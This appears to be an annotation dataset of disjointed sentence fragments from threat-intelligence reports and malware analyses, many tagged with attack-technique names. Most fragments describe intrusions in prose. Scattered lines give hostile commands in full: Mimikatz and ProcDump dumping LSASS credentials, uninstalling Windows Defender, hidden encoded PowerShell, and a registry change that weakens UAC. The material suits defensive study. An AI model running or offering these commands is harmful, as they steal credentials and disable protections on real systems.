the plaintext credentials in PowerShell scripts
the team found a .txt file containing plaintext credentials for the user
The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server.
Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password
The team cracked a user’s workstation account password after learning the user’s patterns from plaintext credentials.
Detect and Identify source IP
Detect and Identify source IP
Detect and identify source IP
Detect and identify source IP
Detect and identify source IP
Windows Service Creation
Windows Service Creation
Windows Service Creation
execute a payload via SMB and Windows Service Creation, respectively, on several target Workstations.
execute a payload via SMB and Windows Service Creation, respectively, on a target DC.
execute a payload via Windows Service Creation on target workstations and the DC.
The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected.
The krbtgt account is a domain default account
Use of non-secure default configurations
The organization used default configurations for hosts with Windows Server 2012 R2.
The default configuration allows unprivileged users to query group membership of local administrator groups
The red team used and identified several standard user accounts with administrative access from a Windows Server 2012 R2 SharePoint server.
The team discovered several standard user accounts that have local administrator access to critical servers.
This misconfiguration allowed the team to use the low-level access of a phished user to move laterally to an Unconstrained Delegation host and compromise the entire domain.
If a user with administrative access is compromised, an actor can access servers without needing to elevate privileges
Some workstations allowed unprivileged accounts to have local administrator access
keylogged a user during a mandatory password change
spear phishing attachments.
spear phishing attachments for Initial Access
As attackers can quickly change spear phishing attachments
suspicious email attachments or other phishing techniques.
modification of Registry Keys/Startup folder for persistence
Using valid accounts
valid accounts
and protocols, such as for Remote Desktop Protocol
used to download files…
The second stage payload, which was later determined to likely be the penetration testing framework "Brute Ratel," was then downloaded via a connection
“RClone” was downloaded on the file servers
which allowed the threat actor to move freely between domains.
Two ".bat" files were sent throughout the organization.
before running the ".cmd" file contained within the ISO.
this CMD file calls the "db" file. In both samples,
.bat files
USING ".BAT" FILES
The two ".bat" files that were sent
cc.bat is a simple script
w.bat as viewed through the bash command "cat":
these are the same commands as observed in the ".bat" files:
Both were designed to turn off antivirus and anti-malware software.
.bat files designed to disable Cisco AMP / Microsoft Defender
the command "net stop Cisco AMP".
showing the “uninstall” commands for Windows Defender:
DISABLING ANTIVIRUS/MALWARE SOFTWARE USING ".BAT" FILES
were both designed to turn off Antivirus and Antimalware software.
designed to stop Cisco AMP.
Stopping Cisco AMP /  Disabling Microsoft Defender
From the two phishing emails, both attachments contain similar malware.
The phishing attachment was submitted to the target in a response to an ongoing conversation
When downloaded, the initial attachment is a local HTML file.
were able to be decrypted by leveraging the decryption script
adds itself to a scheduled task.
The emulated C2 Server is now running an HTTPS server
shows that this connection was likely HTTPS
the communication is consistent with HTTP/S traffic.
on TCP port 2222.
most of the connection attempts to the C2 IP’s are conducted over TCP port 443.
Due to TCP port 2222’s common use as an alternate port for SSH communication, the Malware Analyst recorded a manual SSH connection to the emulated C2 host
some data exfiltration or interaction with the downloaded second stage from the C2.
show the transfer of files using SMB.
Files commonly observed transferred via SMB include
Showing the Transfer of Cobalt Strike Beacons using RDPClip:
allows for lateral movement leveraging RPC to create SMB traffic.
indicating the use of Remote Desktop Protocol.[
Showing the Transfer of Cobalt Strike Beacons using RDPClip:
the use of RDP by the Threat Actor
The second encoded Base64 string was not only base64 but also Gziped for size and obfuscation.
has some simple but clever obfuscation in place.
This shows the decoded and uncompressed data.
payload decoder from Github
used to decode the body
Task manager was then use to reveal the service running on PID 3488,
requests using RC4 encryption
was abused by the attacker to steal client data.
the malware copied itself to "$CURRENTUSER\AppData\Roaming\Microsoft\Isoaahffo\djkuuhd.dll," as confirmed by the file's hashes shown below, and sets itself to auto run.
the process imbedded itself into wermgr.exe, the Windows Error Reporting Manager (Process ID 6660).
This uses a mixture of disguising the ASCII as UTF-16 via manipulating the start of the file, as well as obfuscating the data using a simple cypher.
running the malware sets itself up as the service
after reaching the local DC, the attacker was able to gain a better lay of the land and observe the presence of the other two domains.
a technique leveraging the Windows Management Instrumentation (WMI) service to execute malicious code.
indicating that the user deleted the collected data.
group utilizes sideloading
DLL for sideloading
The group uses DLL sideloading
detect and remove Alibaba Cloud Security from compromised instances
relied on their victims to execute the malicious MSI installers
uses cmd.exe to download files from Alibaba Cloud Object Storage Service.
executes OSSUTIL (included in the installer package as ssu.exe) to download files
use API calls such as VirtualAlloc to load and execute malicious components into memory
invokes the Windows API function DisableThreadLibraryCalls
create scheduled tasks to achieve persistence
Create scheduled tasks to execute the loader and updater components
scheduled tasks created for the updater,
four scheduled tasks are created:
creates a registry Run key to achieve persistence
use various encryption algorithms to hide payloads and strings.
execute an encrypted payload located in the embedded DLL
contains an XOR-encrypted payload, divided into three files
encrypted with a different, single byte XOR key
use dynamic API resolution to avoid detection.
calling an export function of the DLL
reconstructs the imports table of the DLL and calls the DllEntryPoint,
the DLL will find the address of an export function called SVP7, which contains the entry point of the malware,
used DLL side-loading to execute their malicious payloads
side-loading a malicious DLL, libpng13.dll
by side-loading dr.dll, used by a legitimate, signed binary
, side-loaded by the same legitimate executable
contains shellcode and an embedded DLL file that loads FatalRAT
contains an embedded DLL
execute an encrypted payload located in the embedded DLL
has keylogger functionalities
Capture keystrokes
encrypts data with a custom encryption algorithm before it is sent to the C&amp;C server.
uses TCP for C&amp;C communications.
exfiltrates data over the same channel used for C&amp;C
Drop a file named ossutilconfig in the %USERPROFILE% directory
Drop and execute the legitimate installer in C:\Program Files\Common Files (see CommonFiles64Folder).
by side-loading dr.dll, used by a legitimate, signed binary
The original libpng13.dll is also included in the installer package (renamed to what appears to be a random name) because the malicious DLL forwards its exported functions to the original DLL.
download files from an attacker-controlled bucket in Alibaba Cloud
download and execute further shellcode
obfuscated the loader with many calls to a function that just prints some hardcoded values
decrypt,
decrypts the payload is the same as the function used in FatalRAT to decrypt its configuration
decrypt its configuration strings
the decompiled code used to decrypt strings
Decompiled code of a function used by a FatalRAT
using a variety of software packers
one Zip contained a benign file named screenshot1242.jpeg and another contained a file named privatecopy.pdf.
When someone tries to double-click these decoy files, Windows (or the application mapped to the relevant filetype) throws an error because the file isn’t the type of file it appears to be
The target would then, naturally, double click the other file in the Zip archive
command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.
90 other encrypted
 A heavily obfuscated VBS
The initial infector is a Visual Basic script, heavily obfuscated
A block of base64-encoded, encrypted data comprises almost 150KB of that script,
segments of base64 data
along with code that decodes and decrypts the block of base64.
When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes.
The PowerShell script decoded from the Ir8 variable uses Reflection.
performs a BXOR to decode the bytes
for the Ir8 script to decode.
These work in tandem to insert data into the Windows Registry
The concatenated segments of base64 data from O7 get inserted into the Registry,
to load the final payload into memory from a Registry value without
It created a Run key in the Registry
And that Run key references a different Registry key
On one machine, we found that the malware injected itself, using process hollowing, into ielowutil.exe
obfuscated with legitimate resources
encrypted stack strings
Embedded Resource
shellcode from the .data section
shellcode that was stored in the .data section is now stored in the .rsc section
advapi32.CryptHashData
will create a key using advapi32.CryptDeriveKey
advapi32.CryptEncrypt
kernel32.LoadLibraryA, kernel32.GetProcAddress, kernel32.VirtualAlloc, kernel32.VirtualProtect and ntdll.ZwFlushInstructionCache
kernel32.VirtualALloc
kernel32.VirtualProtect,
kernel32.GetLastError
kernel32.CreateMutexA
wininet.HttpSendRequestA,
shellcode injection
copy each PE section one at a time
creating another PE in memory,
injecting a PE executable
handle to the current process for the purpose of allocating memory with PAGE_EXECUTE_READWRITE permissions
decrypt the shellcode
decyrpt its C2 configuration
get a pointer to the encrypted shellcode and to decrypt it have been broken out into their own separate functions
will need to resolve these APIs dynamically to interact with the Windows operating system
resolving many different Windows APIs using kernel32.GetProcAddress
enumerating the Process Environment Block (PEB)
HTTP HEAD request
check if it is connected to the internet by making a request
will make a HTTP GET request
will make a POST request
NBTScan for network reconnaissance
System Network Connections Discovery
PsExec for lateral movement
obtained credentials for pivoting with Mimikatz
detect memory dumps of the lsass process
OS Credential Dumping: LSASS Memory
had been archived
encrypted copy
encrypting the base encryption key with RSA (with a hard-coded 1024-byte public key) and encoding it in Base64.
uploaded.
Exfiltration Over C2 Channel
to run bruteforcing offline.
scan hosts for so-called Eternal* SMB vulnerabilities with SMBTouch and then, where possible, run the EternalBlue exploit and infect the computer
Exploitation of Remote Services
SysUpdate and HyperBro backdoors were installed
push Polar ransomware to computers and run it,
Three files are sent to the victim's computer:
obtained the credentials of a domain administration at headquarters
account of the compromised domain admin
Valid Accounts: Domain Accounts
is a .NET DLL library (compiled on April 29, 2020) imported when GDFInstall.exe is run
XOR decrypted with key ABCSCDFRWFFSDJJHGYUOIj.
decoded with Base64
decrypts a third component
decrypted and decoded version
Deobfuscate/Decode Files or Information
payload and intermediate library are deleted before completion
deletes the intermediate DLL library and encrypted ransomware
del
del
yielding a PE file that is loaded and run in memory with .NET.
wmic
Windows Management Instrumentation
wmic
cmd.exe
Command and Scripting Interpreter: Windows Command Shell
looks for
list of connected disks and starts recursive traversal of directories
sends an HTTP POST request with the name of the victim's computer to a server
T1071
Application Layer Protocol: Web Protocols"
SCHTASKS /Create
schtasks /run
Scheduled Task/Job: Scheduled Task
Scheduled Task/Job: Scheduled Task
Exploit Public-Facing Application
Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
Valid Accounts: Default Accounts
Exploitation for Privilege Escalation
System Information Discovery
Lateral Tool Transfer
Data from Local System
Encrypted Channel: Symmetric Cryptography
Unpacked file names
obfuscation of the GuLoader shellcode and payloads
to download additional malicious files
subsequently download Remcos on the target system
:taking full control of the infected machinerecording keystrokes in real time with
The second shellcode revealed after the unpacking algorithm finished processing
this executable is an archive that can be unpacked with the help of 7zip
Once we unpack the file, we can see several elements, as well as directories typical for NSIS:
It is unpacked
This packer has been around for many years
Then the functions are used to load and decrypt the payload.
The decryption function is custom
custom decryption algorithm is being applied on the buffer
The algorithm used for the buffer decryption differs across the samples.
This shellcode is used for decrypting
the key that will be used for the decryption is prepared.
After the PE is decrypted
we can see decryption of the next stage with the help of a custom algorithm
It contains a very similar function dedicated to decrypting and loading the final payload
Both of them are encrypted,
loading the final payload (PE file) from the third of the encrypted files.
The authors used several common techniques to obfuscate this process.
passing the path to the encrypted component as a parameter.
obfuscating malicious elements.
As before, they are resolved by their hashes.
Then, a function defined by its hash is retrieved (using the same hashing algorithm that was used to retrieve imports from normally loaded DLLs):
By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.
functions has been resolved by their hashes.
The hashing function used for import resolving
By extracting the syscalls, and executing them manually, the malware can use the API of the operating system,
using low level APIs: NtCreateSection, NtMapViewOfSection
Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.
The function GetTempPathW is used
The low-level functions, directly related with performing the injection, are called via raw syscalls
PE injection
The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing
a second, encrypted component, which carries the payload.
a check against blacklisted processes.
exploiting vulnerabilities in the remote desktop protocol (RDP).
distributing phishing emails containing malicious files
it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack
a malicious template file is downloaded and executed
to trigger the retrieval of the final stage payload
This enables the document to fetch the .dotm file from the remote server required for further actions
Upon opening the malicious document
an obfuscated VBA macro
“cmd /c
the Windows Registry or NTFS Extended Attributes to hide their data,
hide a second stage payload in registry transaction files
perform a
number of changes on the filesystem or registry,
to store and retrieve binary data with
the Windows API.
It provides
applications with API functions—available
accessible through API functions.
opened with the CreateLogFile() API
using the clfsw32.dll API function
This function is
patched using Microsoft Detours—a publicly available library used for
instrumenting Win32
functions—so
resolves the function
address for the ServiceMain export function
via the API CreateFileTransactedA()
via the API
NtCreateSection()
Malware Obfuscation
most of the strings used by
PRIVATELOG and STASHLOG are obfuscated
each string is therefore
encrypted with a unique byte stream.
relies on XOR’ing each byte with a hard-coded
the
control flow obfuscation.
In addition to containing obfuscated strings, the installer’s code
is protected using various control flow obfuscation techniques that
make static analysis cumbersome
the installer
generates and prints out encryption keys that the actor uses to
pre-encrypt the payload before it is written to disk
Following the payload header, the malware expects blocks of
encrypted data with 8-byte headers.
Each block is then
re-encrypted with the new key material as follows:
 The encryption key is the 16-byte GUID
The encryption algorithm
is HC-128,
Sample string deobfuscation
some of the deobfuscated strings from the installer
are used for logging error messages and
the installer opens and decrypts the
contents of the file passed as an argument
decrypted file contents
the decrypted data matches
the payload
the malware decrypts
each block using HC-128
the payload which will be
decrypted.
its contents are decrypted
using the HC-128 encryption algorithm
The decryption key and IV are
generated using the same unique host properties
only decrypts the first matching
block
the decrypted
payload contents
file that
should be hidden in a CLFS file
it searches for .blf files in the
default user’s profile directory
starts by enumerating *.blf files in the default user’s profile
directory
malware
also checks that the operating system version
The injection
process
For example,
to open a registry key in a transaction, the functions
RegCreateKeyTransacted(), RegOpenKeyTransacted(), and
RegDeleteKeyTransacted() are available.
The GUID returned from the registry value
Mimikatz to steal credentials from host memory.
Mimikatz
Uses Mimikatz to harvest credentials.
decrypts them locally.
Once decrypted,
begins to decrypt and parse its embedded configuration
decrypting the rest of the blob once it has been decoded.
Once the REvil configuration has decrypted
Decrypted REvil configuration
decrypted Ransom Cartel configuration
they are written to the registry,
it is written to the registry key SOFTWARE\\Google_Authenticator\\b52dKMhj,
Once the data has been written to the registry
stored within the registry
Modifies the Registry to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1.
first checks to see if the registry already contains previously generated values; if so, it will read those values into memory.
the command line provided to the ransomware is parsed.
cmd.exe
Uses cmd.exe to execute commands.
to disable UAC remote restrictions by setting SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy to 1.
Adds registry run keys to achieve persistence.
to download and install payloads
to retrieve the malicious payload and download additional resources
Downloads and uploads files to and from the victim’s machine.
the tool downloads the files
Uses legitimate VPN, RDP, Citrix or VNC credentials to maintain access to an environment.
Deploys PDQ Inventory Scanner tool.
using a cracked version of a legitimate tool called PDQ Inventory, which is a legitimate system management solution that IT administrators use to scan their network and collect hardware, software and Windows configuration data
to enable offline password cracking.
Uses Rundll32 to load and execute malicious DLL.
the ransomware will proceed to spawn another instance of itself via rundll32.exe
Deletes some of its files used during operations as part of cleanup, including removing applications such as 7z.exe, tor.exe, ssh.exe
Uses encoded PowerShell commands.
utilizing string encryption
encrypted configuration
a base64-encoded ransom note,
The configuration is stored as a base64-encoded blob, whereby the first 16 bytes of the base64-encoded blob is the RC4 key
opts to obfuscate their ransomware much more heavily
Searches for specific files prior to encryption.
seeks out files with the following file extensions: .log, .vmdk, .vmem, .vswp and .vmsn.
Target specific file path
to search machines for certain files
Uses AnyDesk to remotely connect and transfer files.
used this as a remote access tool to establish an interactive command and control channel
Routes traffic over TOR and VPN servers to obfuscate their activities.
TOR sites redirecting to a new ransomware operation
API hashing
the username
computer name, domain name, locale and product name.
leads to a function that iterates over a call
executes the batch file,
a batch script used
batch files
A new batch file, localdisk.bat, was also executed
These discovery actions were completed several times again in other various batch files.
it was executed using a command line argument
a batch file.
the execution of the batch file
The batch file eyewear.bat then executed two commands
C:\Windows\system32\cmd.exe /c
C:\Windows\system32\cmd.exe /c
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe
enter this directly in the host OS command shell.
C:\Windows\system32\cmd.exe /C
:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
C:\Windows\system32\cmd.exe /C
cmd.exe /C
invoked from the command line
Another batch file
leveraged by a batch file
C:\Windows\System32\cmd.exe /C
using the command line
the threat actors dropped several batch scripts on the server:
the batch file
cmd.exe /c
cmd.exe /c
cmd.exe /c
cmd.exe /c
a batch file
The threat actor installed Atera and Splashtop remote access software
They then repeated the install of the remote access software package.
the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host
AnyDesk was used to move laterally between a workstation and a backup server
three different Remote Access Software were used by the threat actor
the threat actor used three different tools in order to establish an interactive and persistent command and control channel.
the installation of the remote management tools
began their first lateral movement to a server in the environment by copying their Cobalt Strike DLL over to the host and executing it
the threat actors moved to install AnyDesk on several servers including a backup management host, likely as a further means of persistence or later command and control.
they connected to a domain controller and dropped three scripts; one to copy the ransomware executable to all hosts, one to reset every users password in the organization, and a final one to execute the staged ransomware payload using PsExec
executing it via a remote service.
proceeded to dump LSASS memory
ProcDump was used to dump LSASS memory.
several different Mimikatz implementations were executed on the domain controller, including a Mimikatz executable
There were several variants of Mimikatz in binary and PowerShell form
C:\Windows\system32\cmd.exe /C mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
C:\Windows\system32\cmd.exe /C mimikatz.exe privilege::debug sekurlsa::logonPasswords full samdump
Multiple injections into the LSASS process were observed on multiple hosts.
LSASS process to access credentials.
Process dump of the LSASS process
the lsass.exe beacon
c:\windows\temp\procdump64.exe -accepteula -ma lsass.exe
Several more beacons were also loaded on the host using DLLs and PowerShell.
the threat actor moved on to downloading a variety of beacon executables
to execute various dropped tools or beacons on the endpoint,
files that where downloaded from those sites:
file downloads relating to tooling/scripts.
The threat actors downloaded the lsass.exe beacon from their attacker hosted infrastructure
Lots of custom scripts dropped by threat actors
Other tools and scripts were dropped onto one endpoint
the threat actors often opened Internet Explorer to download their beacons
The threat actors dropped the first of their ransomware binaries on the fourth day of the intrusion
the threat actors had the clear text credentials for one of the domain administrator accounts and began moving lateral to other systems
They issued remote commands using WMIC to conduct discovery, as well as distribute and execute Cobalt Strike beacons.
additional beacons executed using remote WMIC commands,
executed using remote WMI commands
The use of WMIC was leveraged by a batch file
wmic /node
Threat actors used the lolbin wmic.exe in order to execute PowerShell Cobalt Strike beacons on multiple workstations and servers
WmiPrvSe.exe (WMI Provider Host) executed the PowerShell Cobalt Strike beacon on the remote computers.
the threat actors proceeded to RDP to the domain controller.
starting the RDP session
run from their interactive RDP session
used to proxy RDP connections and connect to another computer.
The use of RDP was extensively used throughout the intrusion, using a variety of processes
establishing RDP connections
During these RDP sessions,
This file was opened during their RDP session and contained the PowerShell commands used to launch a new beacon:
RDP traffic and minimize external RDP access
RDP traffic
They then opened an RDP connection back to the primary domain controller
the threat actors executed a PowerShell command to disable Windows Defender Antivirus on the host
Windows Defender tampering
powershell.exe Uninstall-WindowsFeature -Name Windows-Defender-GUI
reviewed Group Policy Objects for the domain.
the user clicked on the ISO file, which created a new virtual hard drive disk
when the victim clicked on the LNK file, it triggered the execution of the batch file
Clicking on the LNK file executes the batch file
a hidden directory
located in a hidden folder
the hidden view attribute in file explorer in reference to the ProgramData folder.
delivered a hidden directory
The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.
DLL was executed using rundll32.exe :
C:\Windows\system32\cmd.exe /c D:\max\eyewear.bat
 ➝ rundll32
This process was invoked by RunDLL32.exe
malware running via Rundll32
file was executed by the injected Rundll32.exe process.
a single Rundll32.exe process
rundll32 locker_32.dll,run
loads it using rundll32
The decoded PowerShell function
Decoded from Base64:
A scheduled task was then created using this same DLL.
A scheduled task was created at that time to maintain persistence on this host
GetSystem creates a service
used to inject a new beacon or a specific program to another process on the victim’s computer.
The injection is also visible from memory dumps
Several hosts showed rundll32 processes exhibiting common process injection behavior
Code injection in LSASS
an injected Cobalt Strike beacon
the injected Rundll32.exe process.
The common processes observed were two injected processes
a beacon injected into a single Rundll32.exe process
to discover information relating to the user
host,
cmd.exe /C hostname
systeminfo
systeminfo
queried a number of target hosts to determine the host disk drive configuration
This can be useful to determine drives, including mounted network shares.
logicaldisk get caption,description,drivetype,providername,volumename
network configuration
ipconfig /all
ipconfig
C:\Windows\system32\cmd.exe /C dir /s *file/
threat actors used the dir command
C:\Windows\System32\cmd.exe /C dir
This was double base64 encoded.
PowerShell Base64 encoded string:

The -e is short for -EncodedCommand.
The base64 encoding starts with JAB that is a common pattern for UTF-16 starting with $
PowerShell encoded commands:
powershell -np -w hidden -encodedcommand
used to proxy
Proxying RDP traffic via a processes such as a Cobalt Strike beacon reduces the exposure of the threat actor’s own infrastructure, and blends RDP activity to those of internal hosts on the network.
the threat actors made attempts to proxy RDP traffic
the RDP traffic was being proxied through
attempted to masquerade dropped files as legitimate Microsoft Windows executables
Once the file was unpacked
the documents were exfiltrated over one of the encrypted C2 channels.
When the payload was executed, there were some telltale registry events observed
files were then deleted
packed versions uploaded to VT
pack the code’s dependencies into the .NET assembly so it can run self-contained.
compression using QuickLZ
with names invoking popular videogames such as Fortnite, Valorant, Roblox or Warzone2.
create a legitimate looking folder to drop an illicit version of the System Configuration Utility msconfig.exe
creates the folder “C:Windows System32”, with a space after Windows
packaged into an obfuscated PowerShell batch file
heavily obfuscated batch file is hidden and automatically executed when launched.
script extracts two separate binaries from the base64 encoded text
another obfuscated binary carrying an embedded resource
extraction of the resources leads to the final payloads
Option to embed additional malware to be executed
the rootkit’s DLL that is embedded as a resource
fileless and executed only in memory after going through several decryptions and decompression routines
AES decrypts, and GZIP decompresses it to produce two separate byte arrays
will be decompressed and decrypted
decompress and decrypt the final payload
Hooks several functions from ntdll.dll to hide its presence.
leveraging Windows Management Instrumentation (WMI) to identify the system’s manufacturer.
identify the system’s manufacturer
delivered to the victim, commonly through a phishing mail
receives a ZIP file containing a benign file in plain sight
automatically executed when launched.
bat file format
spawned with PowerShell via Task Scheduler
using PowerShell.
base64 encoded text later in the file
more obfuscation and encryption techniques that lead to the final payload.
stored as obfuscated data in the registry
prefix is used to hide files, directories, NamedPipes, scheduled tasks, processes, registry keys/values, and services.
writes it as encrypted data.
deletes it as soon as the utility is running
stored as obfuscated data in the registry
Creating a registry key to store the malware code
saves its configuration as a registry key.
spawned with PowerShell via Task Scheduler
Creating a scheduled task to execute the malware using PowerShell.
injected into the winlogon.exe process.
injected into other processes.
injects itself and additional malware(s) into all processes
be injected into the winlogon.exe process
carries out process injections
loads a fresh copy of ntdll.dll,
loading a fresh copy of “ntdll.dll” from disk to avoid process hollowing detection
executed via dllhost.exe using process hollowing techniques.
injects the rootkit when new processes are created
Injects the rootkit to a newly created process by another process and updates the callee via NamedPipe
executes an executable using process hollowing
Enumerates all running processes
executes a file using ShellExecute
utilizes the same Common Name in their TLS certificate.
secure communication through TLS encryption.
support for TCP network streams (both IPv4 and IPv6),
Controlling attached camera devices to take pictures of the compromised computer’s surroundings.
takes screenshots at regular intervals.
can periodically take screenshots and store them with information about the foreground process and time since the last user input
To limit the disk space used, images where fewer than 5% of the pixels differ from the most recently stored capture aren’t saved.
similar screen captures
uses a custom network protocol, which can function over HTTP
we can see one more HTTP request
HTTP POST request used for FlowCloud C&amp;C communication
can send and receive data over HTTP.
communicates with a hardcoded IP address via HTTP.
can communicate over HTTP or via its “normal protocol”.
The HTTP protocol uses the message format detailed in the previous paragraph, but it adds a few extra steps to disguise its traffic as legitimate HTTP
The fields required for HTTP
used for HTTP client requests
used for HTTP server responses
HTTP by prepending the data with a hardcoded
or raw TCP, for C&amp;C server communications.
can communicate over raw TCP sockets.
normal protocol uses raw TCP sockets and a custom message format
which can check running processes
which can check running processes against a hardcoded list
backdoors can list running processes.
functionalities that collect information about programs and processes,
Other commands can be used to retrieve a detailed list of available services and currently running processes.
It checks running processes
the running processes using  CreateToolhelp32Snapshot and  Process32Next
the PID of the process in which the orchestrator is running.
we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products
can check whether specific security software is installed on the machine it tries to compromise,
there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro.
It checks running processes for executables of several known cybersecurity vendors.
contain a section defining specific security software to check for
include the ability to collect mouse movements, keyboard activity
records keystrokes.
backdoor’s components records mouse and keyboard activity to a database.
with the keylogger component of the driver (described in the next section) by reading data from the \\.\pipe\namedpipe_keymousespy_english named pipe.
it acts as both a keylogger
Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0)
handlers for keyboard and mouse events, the driver simply records IO events to lookaside lists before passing them to the legitimate handler.
Keylogging
by compromising a web-facing application such as Microsoft Exchange or SharePoint
exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging CVE-2019-0604
The public-facing application compromise approach
has exploited web server vulnerabilities for initial access.
Initial access to targets is obtained by exploiting vulnerable internet-facing applications such as Microsoft Exchange,
These were either dropped directly via the webshell or downloaded from a remote server
The following files are downloaded and written to disk:
The communications module then downloads the main backdoor module,
This downloader simply downloads the loader
Encoded Royal Road payload
this encrypted file is
The identical encrypted file
deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.
most resources are written to disk encrypted,
In some cases, they are then re-encrypted but with a different key
same sequence of opcodes to obfuscate the program’s flow
control flow obfuscation snippet
files are distributed and stored in encrypted form.
Base64-encoded strings
new encrypted shellcode
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC
and encrypted QuasarRAT payload
control flow obfuscation to hinder analysis
the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process.
that decrypts hardcoded shellcode
Shellcode decryption loop
and only decrypted in memory when needed.
the loader decrypts and parses the embedded installation configuration
the rootkit module is decrypted
the self-decrypting DLL,
[sic] section of a decoded FlowCloud config
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme
Once it has decrypted the embedded DLL
Self-decrypting DLL
The loaded shellcode is a self-decrypting DLL.
DLL decryption routine
and only decoded as needed.
a thread that decrypts and loads the fcClient module
The decrypted shellcode
decrypt the embedded module
into the shellcode that will decompress and load the Korplug payload.
It decrypts and loads
decrypted before being written
and injects it into iexplore.exe using WriteProcessMemory.
The next stage, injected into iexplore.exe
The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.
the injection process
perform process injection to masquerade as harmless processes.
The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.
The loader injects an orchestrator into memory in a svchost.exe process.
the orchestrator injects the network component into memory
the process into which the shellcode will be injected
and inject    shellcode,
Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.
the task or service attains persistence by being set to start automatically on boot
It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.
uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.
named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory.
This process is further camouflaged by changing its associated executable filename to one of svchost.exe or dllhost.exe in the same kernel structure.
registry key where each embedded resource is to be written
by writing to specific registry keys.
Network shellcode registry keys
stored in the Windows registry.
shows the three registry keys used
creating the files and registry keys
2001Path to the registry key for the PrintProcessor service
The paths and registry keys to use
it can create a service
service is then created
can be configured to create a service for persistence.
it can create a service or scheduled task.
persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task
This task will run the DLL hijacking target as SYSTEM at each boot.
uses COM interfaces to schedule tasks
creates a scheduled task for persistence.
service was configured to execute the next step of the installation process by running a legitimate application
service is then created to run that module and is immediately started
target for DLL side-loading
DLL side-loading
the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL
the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing),
uses DLL Side-Loading to launch its second-stage dropper.
If a task with the same name already exists, it is deleted before the new one is created
After hijacking the aforementioned drivers, the rootkit erases the DLL names associated with them from internal structures used to display device drivers.
Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.
removing their entries from the ActiveProcessLinks list of the undocumented KPROCESS kernel structure.
The file is then deleted from the disk
deletes its rootkit’s executable after launching it.
then starts a suspended process to perform injection on it.
stores collected data in local SQLite databases prior to exfiltration.
Each manager stores collected data in its own SQLite database, while data that is collected on demand is returned directly to the C&amp;C server
uses local caches to stage data
data can be collected locally by the corresponding class before it is staged for exfiltration.
can exfiltrate files from local file systems.
The corresponding files are collected
Monitoring file system events to collect new and modified files.
can search through connected file systems and obtain directory listings.
walks through all mapped file systems and collects files
collects file and directory metadata
uses malicious RTF and DOCX attachments to compromise victims.
sending spearphishing emails with malicious attachments such as RTF documents created via the Royal Road builder
makes extensive use of the Windows API to execute commands and launch processes.
performs the functions of LoadLibrary and calls the loaded module’s startModule export.
used for function imports (via GetProcAddress)
perform WMI queries
uses WMI for lateral movement and information gathering.
runs WMI queries every second to get all process creation and termination events.
lateral movement scripts such as WMIExec.
use locally configured proxies.
can use XOR, TEA, RC4 and a modified AES algorithm to encrypt traffic and files.
It is encrypted using the AES algorithm
The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.
the embedded DLL
the embedded DLL
It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources
This module is embedded in the library’s resource section and encrypted with an algorithm similar to RC4
the function used to encrypt and decrypt the embedded module
Another component collects information about mapped volumes, including mount point, name, drive type, and disk usage data.
This is sent to the server along with the computer’s name
